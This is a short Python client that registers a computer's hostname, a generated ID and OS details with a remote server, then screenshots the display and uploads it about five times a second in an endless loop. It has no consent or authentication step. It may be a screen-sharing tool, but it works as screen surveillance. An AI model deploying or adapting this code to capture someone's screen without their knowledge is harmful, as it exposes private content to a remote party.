import pyautogui
import cv2
import numpy as np
import requests
import time
import socket
import platform
import uuid
from datetime import datetime

# Get device hostname (your PC name)
CLIENT_ID = socket.gethostname()

# Generate a unique UUID for this client instance
UID = str(uuid.uuid4())

# Get OS info
OS_INFO = platform.system() + " " + platform.release()

SERVER_BASE_URL = "https://rk2kcl-3000.csb.app"
REGISTER_URL = f"{SERVER_BASE_URL}/register"
UPLOAD_URL = f"{SERVER_BASE_URL}/upload/{CLIENT_ID}"

def register_client():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = {
        "clientId": CLIENT_ID,
        "uid": UID,
        "hostname": CLIENT_ID,
        "os": OS_INFO,
        "timestamp": timestamp
    }
    try:
        res = requests.post(REGISTER_URL, json=data)
        res.raise_for_status()
        print(f"✅ Registered client {CLIENT_ID} with UID {UID}")
    except Exception as e:
        print(f"❌ Failed to register client: {e}")

def send_frame():
    screenshot = pyautogui.screenshot()
    frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
    try:
        response = requests.post(UPLOAD_URL, files={"frame": ("screen.jpg", buffer.tobytes(), "image/jpeg")})
        print(f"📤 Sent frame. Status: {response.status_code}")
    except Exception as e:
        print(f"Error sending frame: {e}")

if __name__ == "__main__":
    register_client()
    while True:
        send_frame()
        time.sleep(0.2)
